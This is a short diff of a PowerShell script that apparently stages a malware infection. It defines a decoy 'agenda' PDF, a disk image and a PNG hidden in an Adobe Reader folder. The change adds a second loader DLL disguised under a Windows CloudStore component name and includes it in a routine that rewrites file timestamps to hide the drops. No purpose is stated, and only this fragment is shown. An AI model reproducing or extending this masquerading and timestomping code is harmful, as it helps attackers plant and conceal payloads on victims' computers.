@@ -54,6 +54,7 @@ do {
     $pdfDst = Join-Path $pdfDir 'Agenda_15-19_6-2026.pdf'
     $imgDst = Join-Path $pdfDir 'DocShare.img'
     $dllDrop = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\CloudStore\Shell\Windows.CloudStore.Schema.Shell.dll'
+    $loaderDrop = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\CloudStore\Shell\Windows.CloudStore.dll'
     $pngDrop = Join-Path $env:ProgramData 'Adobe\ARM\Reader_26.001.21563\Downloads\Agenda_15-19_6-2026.png'
 
     try {
@@ -63,7 +64,7 @@ do {
         Copy-Item -LiteralPath $pdfSrc -Destination $pdfDst -Force -ErrorAction Stop
     } catch { }
 
-    Apply-StampTimes -Paths @($pdfDst, $dllDrop, $pngDrop)
+    Apply-StampTimes -Paths @($pdfDst, $dllDrop, $loaderDrop, $pngDrop)
 
     try {
         $shell = New-Object -ComObject Shell.Application
